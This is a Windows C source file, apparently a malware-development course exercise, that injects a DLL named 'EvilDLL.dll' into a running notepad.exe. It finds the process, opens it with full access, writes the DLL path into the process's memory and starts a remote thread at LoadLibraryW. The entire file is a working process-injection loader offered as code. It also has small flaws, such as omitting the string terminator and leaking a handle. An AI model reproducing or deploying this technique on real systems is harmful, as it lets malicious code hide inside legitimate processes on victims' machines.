#include <windows.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <stdio.h>



typedef struct {
    HANDLE hProcess;
    DWORD pID;
} Proc;

Proc GetProcess(const LPWSTR pName) {
    //Get process snapshot
    Proc process_information = {
        .hProcess = NULL,
        .pID = 0
    };

    HANDLE hSnapshot = NULL;
    PROCESSENTRY32 Process = {
        .dwSize = sizeof(PROCESSENTRY32)
    };

    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("CreateToolhelp32Snapshot failed with code: %d\n", GetLastError());
        goto _Cleanup;
    }

    if (!Process32First(hSnapshot, &Process)) {
        printf("Process32First failed with code: %d\n", GetLastError());
        goto _Cleanup;
    }

    do {
        //Convert to lowercase
        WCHAR LowerName[MAX_PATH * 2] = { 0 };

        if (Process.szExeFile) {
            DWORD dwSize = lstrlenW(Process.szExeFile);
            DWORD i = 0;

            RtlSecureZeroMemory(LowerName, MAX_PATH * 2);

            //Convert each character to lowercase and store it in LowerName
            if (dwSize < MAX_PATH * 2) {
                for (; i < dwSize; i++) {
                    LowerName[i] = (WCHAR)tolower(Process.szExeFile[i]);
                }
                LowerName[i++] = '\0';
            }
        }

        if (wcscmp(LowerName, pName) == 0) {
            //Get process information and open handle
            HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, Process.th32ProcessID);
            if (hProcess == NULL) {
                printf("OpenProcess failed with code: %d\n", GetLastError());
            }
            process_information.hProcess = hProcess;
            process_information.pID = Process.th32ProcessID;
            return process_information;
            break;
        }
            
    } while (Process32Next(hSnapshot, &Process));
    printf("No matches found..\n");
    return process_information;

    _Cleanup:
        if (hSnapshot != NULL) {
            CloseHandle(hSnapshot);
        }
}


int RunDLL(HANDLE hProcess, LPWSTR DllName) {
    // Get the address of LoadLibraryW
    PVOID pLoadLibrary = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (pLoadLibrary == NULL) {
        printf("GetProcAddres failed: %d\n", GetLastError());
        return 1;
    }

    size_t sDllName = lstrlenW(DllName) * sizeof(WCHAR);
    //Allocate some memory for the DLL name
    PVOID addr = VirtualAllocEx(hProcess, NULL, sDllName, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (addr == NULL) {
        printf("Allocation failed: %d\n", GetLastError());
        return 1;
    }

    printf("pLoadLibrary Allocated At : 0x%p\nDll Size : %d\n", pLoadLibrary, sDllName);

    //Write the DLL Name in the allocated memory
    size_t written = NULL;
    if (!WriteProcessMemory(hProcess, addr, DllName, sDllName, &written) || written != sDllName) {
        printf("Write to the memory failed: %d\n", GetLastError());
        return 1;
    }
    printf("Bytes written to memory: %d\n", written);


    printf("Scheduling execution!\n");
    //Create remote thread and point it to the address of  LoadLibraryW
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibrary, addr, NULL, NULL);
    if (hThread == NULL) {
        printf("Creating remote thread failed: %d\n", GetLastError());
        return 1;
    }
    CloseHandle(hThread);
    return 0;
}


int main()
{
    LPWSTR ProcName = L"notepad.exe";
    LPWSTR DLLName = L"C:\\Users\\nullb1t3\\source\\Repos\\MalDevAcademy\\x64\\Release\\EvilDLL.dll";

    Proc pinfo = GetProcess(ProcName);
    printf("Process ID: %d\n", pinfo.pID);

    RunDLL(pinfo.hProcess, DLLName);
    
    CloseHandle(pinfo.hProcess);
    return 0;
}


